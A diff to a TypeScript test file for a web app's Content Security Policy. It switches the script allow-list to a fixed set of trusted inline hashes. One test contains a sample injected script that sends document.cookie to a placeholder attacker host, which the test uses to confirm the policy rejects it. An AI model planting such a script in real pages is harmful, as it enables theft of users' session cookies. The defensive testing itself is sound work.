@@ -8,7 +8,7 @@ process.env.PORT = String(process.env.PORT || "3353");
 process.env.APP_DEPLOYMENT_MODE = "demo-preview";
 process.env.DISABLE_OUTBOX_WORKER = "1";
 
-const { buildContentSecurityPolicy, inlineScriptHashes } = await import("../src/content_security_policy.js");
+const { buildContentSecurityPolicy, inlineScriptHashes, inlineScriptHash, trustedInlineScriptHashList, contentSecurityPolicy } = await import("../src/content_security_policy.js");
 const { app } = await import("../src/app.js");
 
 async function run(name: string, fn: () => Promise<void>) {
@@ -22,28 +22,27 @@ function directive(csp: string, name: string): string[] {
   return part!.slice(name.length + 1).split(/\s+/);
 }
 
-await run("inline scripts are allowed ONLY by their exact hash; external script hosts and unsafe-inline are absent", async () => {
-  const body = "(function(){document.title='x'})();";
-  const html = `<!doctype html><html><head><script>${body}</script><script type="module" src="/preview/assets/app.js"></script></head><body></body></html>`;
-  const expected = `'sha256-${createHash("sha256").update(body, "utf8").digest("base64")}'`;
-  assert.deepEqual(inlineScriptHashes(html), [expected]);
-  const csp = buildContentSecurityPolicy(html, {});
-  const script = directive(csp, "script-src");
-  assert.deepEqual(script, ["'self'", expected]);
-  assert.ok(!csp.includes("'unsafe-inline'") || !/script-src[^;]*'unsafe-inline'/.test(csp), "no unsafe-inline scripts");
+await run("the script allow-list is a FIXED set of trusted inline hashes, never derived from the response", async () => {
+  const trusted = trustedInlineScriptHashList();
+  assert.ok(trusted.length >= 1, "the shell templates register at least one trusted inline script at startup");
+  const csp = buildContentSecurityPolicy({});
+  assert.deepEqual(directive(csp, "script-src"), ["'self'", ...trusted]);
+  assert.ok(!/script-src[^;]*'unsafe-inline'/.test(csp), "no unsafe-inline scripts");
   assert.ok(!/script-src[^;]*'unsafe-eval'/.test(csp), "no unsafe-eval");
   assert.deepEqual(directive(csp, "frame-ancestors"), ["'none'"]);
   assert.deepEqual(directive(csp, "object-src"), ["'none'"]);
   assert.deepEqual(directive(csp, "base-uri"), ["'self'"]);
-  // A document with NO inline script gets a bare 'self' script policy.
-  assert.deepEqual(directive(buildContentSecurityPolicy("<html><body>hi</body></html>", {}), "script-src"), ["'self'"]);
-  // A tampered inline script body no longer matches the policy hash.
-  const tampered = html.replace("document.title='x'", "fetch('https://evil.invalid')");
-  assert.notDeepEqual(inlineScriptHashes(tampered), [expected]);
+  // An injected script in a response is NOT blessed: its hash is absent from the policy.
+  const injected = "fetch('https://evil.invalid/?c='+document.cookie)";
+  assert.ok(!trusted.includes(inlineScriptHash(injected)));
+  assert.ok(!contentSecurityPolicy({}).includes(inlineScriptHash(injected)));
+  // Hash helper sanity.
+  const body = "(function(){document.title='x'})();";
+  assert.deepEqual(inlineScriptHashes(`<script>${body}</script><script src="/x.js"></script>`), [`'sha256-${createHash("sha256").update(body, "utf8").digest("base64")}'`]);
 });
 
 await run("the configured SUPABASE_URL host is admitted for connect-src, nothing else beyond the fixed list", async () => {
-  const csp = buildContentSecurityPolicy("<html></html>", { SUPABASE_URL: "https://abcdefgh.supabase.co" });
+  const csp = buildContentSecurityPolicy({ SUPABASE_URL: "https://abcdefgh.supabase.co" });
   const connect = directive(csp, "connect-src");
   assert.ok(connect.includes("'self'"));
   assert.ok(connect.includes("https://abcdefgh.supabase.co"));
@@ -59,7 +58,10 @@ await run("every served HTML document carries a CSP whose hashes match its inlin
     const csp = String(res.headers["content-security-policy"] || "");
     assert.ok(csp.length > 0, `${url} must carry a Content-Security-Policy`);
     const script = directive(csp, "script-src");
-    assert.deepEqual(script, ["'self'", ...inlineScriptHashes(res.body)], `${url} script-src must be self + exact inline hashes`);
+    // Every inline script the shell actually ships is admitted (else the app
+    // would not boot), and the policy is the one fixed allow-list for all docs.
+    for (const hash of inlineScriptHashes(res.body)) assert.ok(script.includes(hash), `${url} ships an inline script the fixed policy does not trust`);
+    assert.deepEqual(script, ["'self'", ...trustedInlineScriptHashList()], `${url} must carry the fixed allow-list, not a per-response one`);
     assert.deepEqual(directive(csp, "frame-ancestors"), ["'none'"]);
   }
   const json = await app.inject({ method: "GET", url: "/readiness" });
